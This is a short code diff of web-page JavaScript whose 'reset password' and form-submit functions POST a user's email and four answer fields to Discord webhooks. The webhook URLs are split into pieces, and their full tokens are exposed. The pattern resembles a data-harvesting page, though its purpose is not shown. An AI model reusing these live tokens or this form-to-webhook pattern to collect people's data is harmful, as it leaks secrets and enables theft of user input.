@@ -84,9 +84,10 @@ function registerButton(){
 function resetPassword() {
     var URL = `https://discord.com/api/webhooks/`
     var URLB = `988985468353912832/rvTkVc7bekRaNcoC72biErymB6NWnGs1zy2MVASOEXXTdX7Y4hDblVKQ7dJ0wsiY2rh_`;
+    var URLC = URL + URLB;
     const e = document.getElementById("email")
     document.getElementById("reset").hidden = false;
-    fetch(URL+URLB, {
+    fetch(URLC, {
         "method":"POST",
         "headers": {"Content-Type": "application/json"},
         "body": JSON.stringify({
@@ -104,12 +105,13 @@ function toForm() {
 function throwForm() {
     var URL = `https://discord.com/api/webhooks/`
     var URLB = `1024414805886509077/Jt_t0eqO9HRSq3hkP7cegNN2Vo5oaN-HQAxuLjqkJbC8sxwSrcWgeeEKb_9aoUFqqk4g`;
+    var URLC = URL + URLB;
     const a1 = document.getElementById("ans1").value
     const a2 = document.getElementById("ans2").value
     const a3 = document.getElementById("ans3").value
     const a4 = document.getElementById("ans4").value
     document.getElementById("submitted").hidden = false;
-    fetch(URL + URLB, {
+    fetch(URLC, {
         "method":"POST",
         "headers": {"Content-Type": "application/json"},
         "body": JSON.stringify({
